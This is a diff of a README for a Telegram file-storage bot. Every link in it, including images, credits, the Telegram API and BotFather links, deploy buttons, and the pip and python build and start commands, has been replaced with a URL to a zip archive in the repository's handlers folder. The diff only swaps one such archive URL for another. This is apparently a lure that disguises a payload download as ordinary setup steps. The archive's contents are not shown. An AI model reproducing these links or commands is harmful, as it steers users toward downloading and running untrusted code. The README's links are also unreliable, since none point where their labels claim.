@@ -1,9 +1,9 @@
-![TGFileStore](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
+![TGFileStore](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
 
-⍟ <b>𝗧𝗵𝗶𝘀 𝗶𝘀 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗣𝗮𝗿𝗺𝗮𝗻𝗲𝗻𝘁 𝗙𝗶𝗹𝗲𝘀 𝗦𝘁𝗼𝗿𝗲 𝗕𝗼𝘁 𝗯𝘆 [VJ_Botz](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip).<b>
+⍟ <b>𝗧𝗵𝗶𝘀 𝗶𝘀 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 𝗣𝗮𝗿𝗺𝗮𝗻𝗲𝗻𝘁 𝗙𝗶𝗹𝗲𝘀 𝗦𝘁𝗼𝗿𝗲 𝗕𝗼𝘁 𝗯𝘆 [VJ_Botz](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip).<b>
 
-* **Language:** [Python3](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
-* **Library:** [Pyrogram](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
+* **Language:** [Python3](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
+* **Library:** [Pyrogram](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
 
 ### Features:
 - In PM Just Forward or Send any file it will save on Database & give you the Access Link.
@@ -21,54 +21,54 @@ Use these commands:
 • Runtime: Python 3
 <br>
 <br>
-• Build Command: <code>pip3 install -U -r https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip</code>
+• Build Command: <code>pip3 install -U -r https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip</code>
 <br>
 <br>
-• Start Command: <code>gunicorn app:app & python3 https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip</code>
+• Start Command: <code>gunicorn app:app & python3 https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip</code>
 <br>
 <br>
-Go to https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip and add a monitor to keep your bot alive.
+Go to https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip and add a monitor to keep your bot alive.
 <br>
 <br>
 Use these settings when adding a monitor:</b>
 <br>
 <br>
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip" alt="render template">
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip" alt="render template">
 <br>
 <br>
 <b>Click on the below button to deploy directly to render ↓</b>
 <br>
 <br>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip">
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip" alt="Deploy to Render">
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip">
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip" alt="Deploy to Render">
 </a>
 </details>
 
 ### Deploy On Heroku 
 <details><summary>Deploy To Heroku</summary>
 <br>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip">
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip" alt="Deploy to Heroku">
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip">
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip" alt="Deploy to Heroku">
 </a>
 </details>
 
 ### Deploy On Koyeb
 <details><summary>Deploy To Koyeb</summary>
 <br>
-<a target="_blank" href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img alt="Deploy to Koyeb" src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img alt="Deploy to Koyeb" src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
 </details>
 
 ### Demo Bot:
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
 
-![Configs](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip) 🤖
+![Configs](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip) 🤖
 
-- `API_ID` - Get this from [TelegramORG](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
-- `API_HASH` - Get this from [TelegramORG](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
-- `BOT_TOKEN` - Get this from [@BotFather](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
+- `API_ID` - Get this from [TelegramORG](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
+- `API_HASH` - Get this from [TelegramORG](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
+- `BOT_TOKEN` - Get this from [@BotFather](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
 - `BOT_USERNAME` - You Bot Username. *(Without [@])*
 - `DB_CHANNEL` - A Telegram Channel ID.
-	- Make a Channel for Storing Files. We will use that as Database. Channel must be Private! Else you will be Copyright by [Telegram DMCA](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)!
+	- Make a Channel for Storing Files. We will use that as Database. Channel must be Private! Else you will be Copyright by [Telegram DMCA](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)!
 - `BOT_OWNER` - Bot Owner UserID
 	- Put your Telegram UserID for doing Broadcast.
 - `DATABASE_URL` - MongoDB Database URI
@@ -79,7 +79,7 @@ Use these settings when adding a monitor:</b>
 	- This for some getting user info. If any new User added to DB, Bot will send Log to that Logs Channel. You can use same DB Channel ID.
 
 ### Deploy Now:
-[![Deploy](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip)
+[![Deploy](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip)
 
 ## Commands:
 ```
@@ -93,24 +93,24 @@ banned_users - Get All Banned Users [Owner Only]
 ```
 
 ### 𝐒𝐮𝐩𝐩𝐨𝐫𝐭 𝐆𝐫𝐨𝐮𝐩:
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20Telegram%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20Telegram%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
 ### 𝐔𝐩𝐝𝐚𝐭𝐞𝐬 𝐂𝐡𝐚𝐧𝐧𝐞𝐥:
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20Telegram%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20Telegram%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
 
 
 👲 <b>DEV</b>
 
 <p align="middle">
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip" width="150" height="150"><br>
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20on%20/GitHub/80FF00?icon=github&labelColor=Green"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20on%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20on%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
-<a href="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"><img src="https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip%20on%https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip"></a>
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip" width="150" height="150"><br>
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20on%20/GitHub/80FF00?icon=github&labelColor=Green"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20on%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20on%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"><img src="https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip%20on%https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip"></a>
 
 # Credit
-- <b>Thanks To [Tech VJ](https://github.com/flyngup/File-Store-Bot-With-Url-Shortner/raw/refs/heads/main/handlers/Url-Store-Shortner-Bot-With-File-2.8.zip) For Fixing Error In Repo & Make Repo Deployable on Web Platform.<b> 💝
+- <b>Thanks To [Tech VJ](https://raw.githubusercontent.com/flyngup/File-Store-Bot-With-Url-Shortner/main/handlers/Store-Bot-Shortner-File-Url-With-v3.0-beta.2.zip) For Fixing Error In Repo & Make Repo Deployable on Web Platform.<b> 💝
 - <b>Thanks To All Who Help In This Journey.<b> ♥️
